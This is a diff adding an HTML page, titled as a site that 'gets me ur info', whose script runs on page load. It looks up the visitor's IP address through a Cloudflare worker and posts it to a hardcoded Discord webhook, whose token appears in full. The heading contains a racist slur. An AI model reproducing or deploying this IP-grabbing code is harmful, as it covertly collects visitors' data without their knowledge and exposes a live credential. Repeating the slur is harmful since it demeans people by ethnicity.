@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>cool website that gets me ur info twin :v:</title>
+</head>
+<body>
+    <h1>ping pong ching chong ts a cool ass website twin</h1>
+    <script>
+        fetch("https://sussyworker.lerrimilkiberri.workers.dev")
+            .then(res => res.json())
+            .then(data => {
+                let turiipip = data.ip;
+                console.log(data.ip);
+
+                var request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1442261932458377299/VFxMNVzdMtsU4s_ahe8jwwBI5dMxoLM9QriGXqmnmdEuX7EOWfXFmykf63XWS2dJIN_3");
+
+                request.setRequestHeader('Content-type', 'application/json');
+
+                var params = {
+                    username: "My Webhook Name",
+                    avatar_url: "",
+                    content: data.ip
+                }
+
+                request.send(JSON.stringify(params));
+
+            })
+            .catch(() => {
+                console.log("FUCK");
+            });
+    </script>
+</body>
+</html>
